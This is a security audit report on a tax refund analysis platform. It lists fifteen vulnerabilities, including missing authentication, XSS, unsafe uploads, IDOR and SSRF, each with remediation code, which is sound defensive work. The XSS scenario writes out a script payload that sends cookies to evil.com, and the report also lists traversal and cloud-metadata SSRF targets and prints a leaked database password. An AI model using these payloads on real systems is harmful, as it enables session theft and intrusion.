# Security Audit Report
**Date**: 2025-11-16
**Auditor**: Security Professional
**Codebase**: Refund Engine - Tax Refund Analysis Platform
**Severity Levels**: CRITICAL | HIGH | MEDIUM | LOW | INFO

---

## Executive Summary

This security audit identified **15 security vulnerabilities** across the Refund Engine codebase, ranging from CRITICAL to LOW severity. The most critical findings include:

1. **Hardcoded database credentials** in documentation and configuration files
2. **No authentication** on Streamlit dashboards allowing unauthorized access
3. **Service role key usage** providing excessive database privileges
4. **Cross-Site Scripting (XSS)** vulnerabilities in multiple Streamlit pages
5. **Insecure file upload handling** without proper validation

**Risk Assessment**: The current security posture poses **HIGH RISK** for production deployment. Immediate remediation of CRITICAL and HIGH severity issues is required before any public or production use.

---

## Vulnerability Findings

### 🔴 CRITICAL SEVERITY

#### 1. Hardcoded Database Password in Documentation
**File**: `FEEDBACK_QUICKSTART.md:19`, `.claude/settings.local.json`
**Severity**: CRITICAL
**CVSS Score**: 9.8

**Description**:
Database password `jSnuCinRda65zCuA` is hardcoded in multiple files:
- `FEEDBACK_QUICKSTART.md` line 19: `export SUPABASE_DB_PASSWORD='jSnuCinRda65zCuA'`
- `.claude/settings.local.json` contains multiple references

**Impact**:
- Complete database compromise
- Unauthorized access to all sensitive data
- Data exfiltration, modification, or deletion
- Potential lateral movement to connected systems

**Recommendation**:
1. **IMMEDIATELY** rotate the database password
2. Remove all hardcoded credentials from tracked files
3. Add `SUPABASE_DB_PASSWORD` to `.gitignore` patterns
4. Audit git history for credential exposure: `git log -p | grep -i password`
5. Consider these files already compromised if pushed to GitHub
6. Implement secret scanning in CI/CD pipeline

**Code Reference**:
```bash
# FEEDBACK_QUICKSTART.md:19
export SUPABASE_DB_PASSWORD='jSnuCinRda65zCuA'
```

---

#### 2. No Authentication on Dashboard
**Files**: `dashboard/Dashboard.py`, `dashboard/pages/*.py`
**Severity**: CRITICAL
**CVSS Score**: 9.1

**Description**:
The Streamlit dashboard has **zero authentication**. Anyone with network access can:
- View all project data
- Access sensitive tax documents
- See invoice information
- Modify configurations
- Upload arbitrary files

**Evidence**:
```python
# dashboard/Dashboard.py:231-232
if 'user_role' not in st.session_state:
    st.session_state.user_role = 'Analyst'  # Default role - NO AUTH!
```

**Impact**:
- Unauthorized access to sensitive financial data
- Data breach of client invoices and tax information
- Potential data manipulation
- Compliance violations (GDPR, SOC 2, etc.)

**Recommendation**:
1. Implement authentication using Streamlit authentication libraries:
   - `streamlit-authenticator`
   - OAuth 2.0 / SAML integration
   - Session-based authentication
2. Add role-based access control (RBAC)
3. Implement session timeout
4. Log all access attempts
5. Add IP whitelisting for additional security

**Example Implementation**:
```python
import streamlit_authenticator as stauth

authenticator = stauth.Authenticate(
    credentials, cookie_name, key, cookie_expiry_days
)
name, authentication_status, username = authenticator.login('Login', 'main')

if not authentication_status:
    st.error('Please login to access the dashboard')
    st.stop()
```

---

#### 3. Supabase Service Role Key Exposure Risk
**Files**: `core/database.py`, multiple scripts
**Severity**: CRITICAL
**CVSS Score**: 9.0

**Description**:
The application uses `SUPABASE_SERVICE_ROLE_KEY` for all database operations. This key has:
- Full admin access to the database
- Bypasses Row Level Security (RLS)
- No rate limiting
- No audit trail

**Code Reference**:
```python
# core/database.py:83
key = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
```

**Impact**:
- If key is compromised, attacker gains complete database control
- No ability to revoke access to specific users/sessions
- RLS policies are ineffective
- Difficult to implement proper access control

**Recommendation**:
1. **Implement Row Level Security (RLS)** on all tables
2. Use `SUPABASE_ANON_KEY` for client operations
3. Create service-specific API keys with limited scopes
4. Implement proper authentication tokens for users
5. Use service role key ONLY for admin operations in isolated scripts
6. Enable Supabase audit logging

**Example RLS Policy**:
```sql
-- Enable RLS
ALTER TABLE knowledge_documents ENABLE ROW LEVEL SECURITY;

-- Policy: Users can only read their own project documents
CREATE POLICY "Users read own documents"
ON knowledge_documents FOR SELECT
USING (auth.uid() = user_id);
```

---

### 🟠 HIGH SEVERITY

#### 4. Cross-Site Scripting (XSS) via unsafe_allow_html
**Files**: `dashboard/Dashboard.py`, `chatbot/web_chat.py`, `dashboard/pages/*.py`
**Severity**: HIGH
**CVSS Score**: 7.5

**Description**:
Multiple Streamlit pages use `unsafe_allow_html=True` without sanitizing user input, allowing XSS attacks.

**Vulnerable Code**:
```python
# dashboard/Dashboard.py:228
st.markdown("""...""", unsafe_allow_html=True)

# dashboard/pages/2_Documents.py:135-143
st.markdown(f"""
    <div class="section-card">
        <div>📄 {doc['id']}</div>  # User input not sanitized!
        <div>{doc.get('vendor', 'N/A')}</div>  # Potential XSS
    </div>
""", unsafe_allow_html=True)
```

**Attack Scenario**:
1. Attacker uploads document with vendor name: `<script>fetch('https://evil.com?cookie='+document.cookie)</script>`
2. Vendor name stored in database
3. When displayed, script executes in victim's browser
4. Session cookies/tokens stolen

**Impact**:
- Session hijacking
- Credential theft
- Phishing attacks
- Malware distribution
- Data exfiltration

**Recommendation**:
1. **Remove `unsafe_allow_html=True`** where possible
2. Sanitize all user input before HTML rendering:
   ```python
   import html
   safe_vendor = html.escape(doc.get('vendor', 'N/A'))
   ```
3. Use Streamlit's safe components instead:
   ```python
   # Instead of markdown with HTML:
   st.markdown(vendor_name)  # Safe, auto-escapes
   ```
4. Implement Content Security Policy (CSP) headers

---

#### 5. File Upload Validation Bypass
**File**: `dashboard/pages/2_Documents.py:56-60`
**Severity**: HIGH
**CVSS Score**: 7.3

**Description**:
File upload accepts multiple dangerous file types with insufficient validation:

```python
uploaded_files = st.file_uploader(
    "Choose files",
    accept_multiple_files=True,
    type=['pdf', 'jpg', 'jpeg', 'png', 'xlsx', 'csv']  # Client-side only!
)
```

**Vulnerabilities**:
1. **No server-side validation** - attacker can bypass `type` parameter
2. **No file size limit** - allows DoS via large files
3. **No content verification** - can upload malicious files with valid extensions
4. **No virus scanning**
5. **No file name sanitization** - path traversal possible

**Attack Scenarios**:
- Upload malicious Excel with macros → code execution
- Upload web shell as `invoice.pdf.php` → remote code execution
- Upload 10GB file → disk space exhaustion
- Upload `../../../../etc/passwd.pdf` → path traversal

**Impact**:
- Remote code execution
- Denial of Service
- Path traversal attacks
- Malware distribution

**Recommendation**:
```python
import magic  # python-magic library

def validate_upload(file):
    # 1. Check file size
    MAX_SIZE = 10 * 1024 * 1024  # 10MB
    if file.size > MAX_SIZE:
        raise ValueError("File too large")

    # 2. Sanitize filename
    import re
    safe_name = re.sub(r'[^a-zA-Z0-9._-]', '', file.name)

    # 3. Verify file type (magic bytes)
    mime = magic.from_buffer(file.read(1024), mime=True)
    allowed_mimes = ['application/pdf', 'image/jpeg', 'image/png']
    if mime not in allowed_mimes:
        raise ValueError("Invalid file type")

    # 4. Virus scan (integrate ClamAV)
    # scan_result = clamd.scan_stream(file)

    # 5. Store in safe location with random name
    import uuid
    safe_path = f"/uploads/{uuid.uuid4()}.pdf"

    return safe_path
```

---

#### 6. Insecure Direct Object References (IDOR)
**Files**: Database queries throughout codebase
**Severity**: HIGH
**CVSS Score**: 7.1

**Description**:
No authorization checks before accessing database records:

```python
# analysis/analyze_refunds.py:164-170
response = (
    supabase.table("vendor_products")
    .select("*")
    .eq("vendor_name", vendor_name)  # No user ownership check!
    .execute()
)
```

**Attack Scenario**:
1. User A creates project with ID `project-123`
2. User B guesses/iterates IDs: `project-124`, `project-125`
3. User B accesses User A's sensitive data

**Impact**:
- Unauthorized data access
- Privacy violations
- Competitor intelligence gathering
- Compliance violations

**Recommendation**:
1. Implement proper authorization checks:
   ```python
   # Check user owns this project
   project = supabase.table("projects").select("*").eq("id", project_id).single().execute()
   if project.data['owner_id'] != current_user_id:
       raise PermissionError("Unauthorized access")
   ```
2. Use UUIDs instead of sequential IDs
3. Implement RLS policies on database
4. Add audit logging for all data access

---

#### 7. API Key Exposure Risk
**Files**: `.env.example`, multiple Python files
**Severity**: HIGH
**CVSS Score**: 6.8

**Description**:
API keys loaded from environment without validation or rotation mechanism:

```python
# analysis/analyze_refunds.py:23
client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))
```

**Risks**:
1. No validation if key is set or valid
2. Keys printed in error messages/logs
3. No key rotation mechanism
4. Keys potentially committed to git history
5. No rate limiting or usage monitoring

**Evidence from grep**:
```
chatbot/rag_ui_with_feedback.py:39:client = OpenAI(api_key=os.getenv('OPENAI_API_KEY'))
chatbot/enhanced_rag_ui.py:33:client = OpenAI(api_key=os.getenv('OPENAI_API_KEY'))
analysis/analyze_refunds.py:23:client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))
```

**Recommendation**:
1. Implement secret management solution (AWS Secrets Manager, HashiCorp Vault)
2. Add key validation on startup:
   ```python
   def validate_api_keys():
       keys = {
           'OPENAI_API_KEY': os.getenv('OPENAI_API_KEY'),
           'ANTHROPIC_API_KEY': os.getenv('ANTHROPIC_API_KEY'),
       }
       for name, key in keys.items():
           if not key or key.startswith('sk-your-'):
               raise ValueError(f"{name} not properly configured")
       return True
   ```
3. Never log API keys:
   ```python
   import logging
   logging.addFilter(lambda record: redact_secrets(record))
   ```
4. Implement usage monitoring and alerts
5. Rotate keys quarterly

---

### 🟡 MEDIUM SEVERITY

#### 8. Server-Side Request Forgery (SSRF) Potential
**Files**: `scripts/download_rcw_title_82.py`, `scripts/download_wac_title_458.py`
**Severity**: MEDIUM
**CVSS Score**: 6.5

**Description**:
Web scraping scripts use `requests.get()` without URL validation:

```python
# scripts/download_rcw_title_82.py:69
response = self.session.get(url, timeout=30)
```

**Vulnerability**:
If URL parameters are user-controlled (future feature), attacker could:
- Access internal services: `http://localhost:6379/`
- Cloud metadata: `http://169.254.169.254/latest/meta-data/`
- Internal network scanning

**Recommendation**:
```python
def validate_url(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)

    # Whitelist allowed domains
    allowed_domains = ['app.leg.wa.gov', 'dor.wa.gov']
    if parsed.netloc not in allowed_domains:
        raise ValueError("Invalid domain")

    # Block private IPs
    import ipaddress
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            raise ValueError("Private IP not allowed")
    except ValueError:
        pass  # Not an IP, continue

    return url
```

---

#### 9. Insufficient Error Handling Exposing Internals
**Files**: Multiple files
**Severity**: MEDIUM
**CVSS Score**: 5.3

**Description**:
Error messages expose sensitive information:

```python
# core/database.py:221-236
except ValueError as e:
    print(f"\n✗ Configuration Error: {e}")  # Exposes config details
    print("Make sure you have set:")
    print("  - SUPABASE_URL")
    print("  - SUPABASE_SERVICE_ROLE_KEY")  # Reveals key names
```

**Impact**:
- Information disclosure
- Assists attackers in reconnaissance
- Exposes internal architecture

**Recommendation**:
```python
import logging

try:
    client = create_supabase_client()
except Exception as e:
    logging.error("Database connection failed", exc_info=True)
    # User-facing message (generic)
    raise RuntimeError("Service temporarily unavailable") from None
```

---

#### 10. Missing Rate Limiting
**Files**: Streamlit dashboards, API endpoints
**Severity**: MEDIUM
**CVSS Score**: 5.0

**Description**:
No rate limiting on:
- Dashboard access
- File uploads
- Database queries
- AI API calls

**Impact**:
- Denial of Service attacks
- Resource exhaustion
- Excessive API costs ($$$)
- Database overload

**Recommendation**:
```python
from streamlit_extras.throttle import throttle

@throttle(5)  # 5 requests per second
def process_upload(file):
    # Upload handling
    pass

# Or use Flask-Limiter for API endpoints
from flask_limiter import Limiter
limiter = Limiter(app, key_func=get_remote_address)

@app.route("/api/analyze")
@limiter.limit("10 per minute")
def analyze():
    pass
```

---

#### 11. Weak Encryption Key Management
**File**: `core/security/encryption.py:33-39`
**Severity**: MEDIUM
**CVSS Score**: 4.8

**Description**:
Encryption key loaded from environment with no key derivation or rotation:

```python
key_str = os.getenv("ENCRYPTION_KEY")
if not key_str:
    raise ValueError("ENCRYPTION_KEY environment variable not set...")
key = key_str.encode()
```

**Issues**:
1. No key derivation function (KDF)
2. No key rotation mechanism
3. Same key for all encrypted fields
4. Key stored in plaintext in environment

**Recommendation**:
```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

def derive_key(master_secret: str, salt: bytes, context: str) -> bytes:
    kdf = PBKDF2(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return kdf.derive((master_secret + context).encode())

# Use different keys for different purposes
db_encryption_key = derive_key(master_secret, salt, "database")
file_encryption_key = derive_key(master_secret, salt, "files")
```

---

### 🔵 LOW SEVERITY

#### 12. Missing Security Headers
**Files**: Streamlit configuration
**Severity**: LOW
**CVSS Score**: 3.7

**Missing headers**:
- `Strict-Transport-Security` (HSTS)
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Content-Security-Policy`

**Recommendation**:
Add to Streamlit config or reverse proxy:
```nginx
# nginx.conf
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "default-src 'self'" always;
```

---

#### 13. Path Traversal Protection Implementation
**File**: `analysis/analyze_refunds.py:53-70`
**Severity**: LOW (Good implementation, minor improvement needed)
**CVSS Score**: 3.1

**Current Implementation** (Good):
```python
def validate_path(self, filename: str) -> Optional[Path]:
    full_path = (self.docs_folder / filename.strip()).resolve()
    if not str(full_path).startswith(str(self.docs_folder)):
        print(f"  WARNING: Path traversal attempt detected: {filename}")
        return None
    return full_path
```

**Improvement**:
Add logging and additional checks:
```python
import logging

def validate_path(self, filename: str) -> Optional[Path]:
    # Log all validation attempts
    logger = logging.getLogger(__name__)

    # Additional filename sanitization
    if '..' in filename or filename.startswith('/'):
        logger.warning(f"Path traversal attempt: {filename}")
        return None

    full_path = (self.docs_folder / filename.strip()).resolve()

    if not str(full_path).startswith(str(self.docs_folder)):
        logger.error(f"Path validation failed: {filename}")
        return None

    return full_path
```

---

#### 14. Discord Webhook Token Exposure Risk
**File**: `agents/core/communication.py`
**Severity**: LOW
**CVSS Score**: 2.7

**Description**:
Discord webhooks loaded from environment but could be logged/exposed:

```python
WEBHOOK_URLS = {
    "discussions": os.getenv("DISCORD_WEBHOOK_DISCUSSIONS"),
    # ... 6 webhooks
}
```

**Recommendation**:
1. Validate webhook URLs on startup
2. Never log webhook URLs
3. Rotate webhooks if exposed
4. Consider using Discord Bot tokens instead for better control

---

#### 15. Dependency Vulnerabilities
**File**: `requirements.txt`
**Severity**: INFO
**CVSS Score**: N/A

**Findings**:
Most dependencies are up-to-date, but continuous monitoring needed:

```
streamlit==1.31.0  # Current: 1.39.0 (update available)
requests==2.31.0   # Current: 2.32.3 (security updates)
PyYAML==6.0.3      # OK
cryptography==44.0.3  # OK (high version number suggests updated)
```

**Recommendation**:
1. Run `pip-audit` regularly:
   ```bash
   pip install pip-audit
   pip-audit
   ```
2. Enable Dependabot on GitHub
3. Schedule quarterly dependency updates
4. Review CVE databases before updates

---

## Security Best Practices Violations

### Authentication & Authorization
- ❌ No authentication mechanism
- ❌ No session management
- ❌ No RBAC (Role-Based Access Control)
- ❌ Service role key used everywhere
- ❌ No RLS (Row Level Security) policies

### Input Validation
- ⚠️ XSS via unsafe HTML rendering
- ⚠️ Insufficient file upload validation
- ✅ Path traversal protection implemented (good!)
- ⚠️ No rate limiting

### Secrets Management
- ❌ Hardcoded credentials in documentation
- ⚠️ API keys in environment (acceptable, but no validation)
- ⚠️ No secret rotation mechanism
- ❌ Credentials potentially in git history

### Cryptography
- ✅ Using `yaml.safe_load()` (good!)
- ✅ Fernet encryption for sensitive fields (good!)
- ⚠️ Weak key management
- ⚠️ No key rotation

### Network Security
- ⚠️ SSRF potential in web scrapers
- ❌ Missing security headers
- ⚠️ No TLS/HTTPS enforcement mentioned

---

## Immediate Action Items (Priority Order)

### 🚨 CRITICAL (Do Today)
1. **Rotate database password immediately**
2. **Remove hardcoded credentials** from all files
3. **Add authentication** to Streamlit dashboards
4. **Audit git history** for exposed secrets

### 🔥 HIGH (Do This Week)
5. Implement Row Level Security (RLS) on database
6. Sanitize all HTML output to prevent XSS
7. Add proper file upload validation
8. Implement authorization checks (prevent IDOR)
9. Add API key validation and rotation mechanism

### ⚡ MEDIUM (Do This Month)
10. Add rate limiting to all endpoints
11. Implement proper error handling
12. Improve encryption key management
13. Add SSRF protection to web scrapers
14. Implement security headers

### 📋 LOW (Do This Quarter)
15. Set up dependency scanning
16. Add comprehensive logging
17. Implement security monitoring
18. Create incident response plan

---

## Recommended Security Controls

### 1. Authentication Layer
```python
# Recommended: streamlit-authenticator
import streamlit_authenticator as stauth

# Or for API: JWT tokens
from jose import JWTError, jwt

def verify_token(token: str):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return payload['user_id']
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

### 2. Database Security
```sql
-- Enable RLS on all tables
ALTER TABLE knowledge_documents ENABLE ROW LEVEL SECURITY;
ALTER TABLE user_feedback ENABLE ROW LEVEL SECURITY;
ALTER TABLE analysis_results ENABLE ROW LEVEL SECURITY;

-- Create policies
CREATE POLICY "Users access own data"
ON knowledge_documents FOR ALL
USING (auth.uid() = owner_id);
```

### 3. Input Validation Middleware
```python
from pydantic import BaseModel, validator
import html

class DocumentUpload(BaseModel):
    filename: str
    content_type: str

    @validator('filename')
    def sanitize_filename(cls, v):
        # Remove path traversal attempts
        safe = v.replace('../', '').replace('..\\', '')
        # Remove special chars
        safe = re.sub(r'[^\w\s.-]', '', safe)
        return safe

    @validator('content_type')
    def validate_content_type(cls, v):
        allowed = ['application/pdf', 'image/jpeg', 'image/png']
        if v not in allowed:
            raise ValueError('Invalid content type')
        return v
```

### 4. Security Monitoring
```python
import logging
from datetime import datetime

class SecurityLogger:
    def __init__(self):
        self.logger = logging.getLogger('security')

    def log_auth_attempt(self, username, success, ip):
        self.logger.info(f"Auth attempt: {username} from {ip} - {'SUCCESS' if success else 'FAILED'}")

    def log_suspicious_activity(self, activity, user, details):
        self.logger.warning(f"SUSPICIOUS: {activity} by {user} - {details}")

    def log_data_access(self, user, resource, action):
        self.logger.info(f"Access: {user} {action} {resource}")
```

---

## Security Testing Recommendations

### 1. Automated Security Scanning
```bash
# Install security tools
pip install bandit safety pip-audit

# Run scans
bandit -r . -f json -o bandit_report.json
safety check
pip-audit
```

### 2. Manual Penetration Testing
- SQL injection testing
- XSS testing (automated + manual)
- Authentication bypass attempts
- IDOR testing
- File upload fuzzing
- Rate limit testing

### 3. Code Review Checklist
- [ ] All user input sanitized
- [ ] Authentication required for sensitive operations
- [ ] Authorization checks before data access
- [ ] Secrets not in code
- [ ] Error messages don't leak info
- [ ] File uploads validated
- [ ] Rate limiting implemented
- [ ] Security headers set
- [ ] Logging implemented
- [ ] Encryption used for sensitive data

---

## Compliance Considerations

### GDPR
- ❌ No data retention policies
- ❌ No user consent mechanism
- ⚠️ Encryption implemented (partial compliance)
- ❌ No data deletion mechanism
- ❌ No audit trail

### SOC 2
- ❌ No access controls
- ❌ No security monitoring
- ⚠️ Encryption at rest (partial)
- ❌ No incident response plan
- ❌ No security awareness training

### PCI DSS (if handling payment data)
- ❌ Not applicable unless processing payments
- But good practices should be followed

---

## Security Architecture Recommendations

### Current Architecture Issues
```
[User] → [Streamlit (No Auth)] → [Supabase (Service Role)]
   ↓           ↓                        ↓
 XSS      File Upload              Full DB Access
```

### Recommended Architecture
```
[User] → [Auth Layer] → [API Gateway] → [Rate Limiter]
            ↓              ↓                  ↓
        [Session]     [Validation]      [Service Layer]
                          ↓                  ↓
                    [RLS Database] ← [Least Privilege]
```

---

## Conclusion

The Refund Engine application has **significant security vulnerabilities** that must be addressed before production deployment. The most critical issues are:

1. **Hardcoded database credentials** (CRITICAL)
2. **No authentication** (CRITICAL)
3. **Service role key usage** (CRITICAL)
4. **XSS vulnerabilities** (HIGH)
5. **Insecure file uploads** (HIGH)

**Estimated Remediation Time**: 2-3 weeks for critical/high issues

**Recommended Actions**:
1. Immediate password rotation and credential removal
2. Implement authentication within 1 week
3. Add input validation and sanitization within 2 weeks
4. Complete RLS implementation within 3 weeks
5. Schedule quarterly security audits

---

## References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Streamlit Security Best Practices](https://docs.streamlit.io/deploy/streamlit-community-cloud/deploy-your-app/app-access-and-authentication)
- [Supabase Security Guide](https://supabase.com/docs/guides/auth)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

**Report End**
*For questions or clarifications, please contact the security team.*
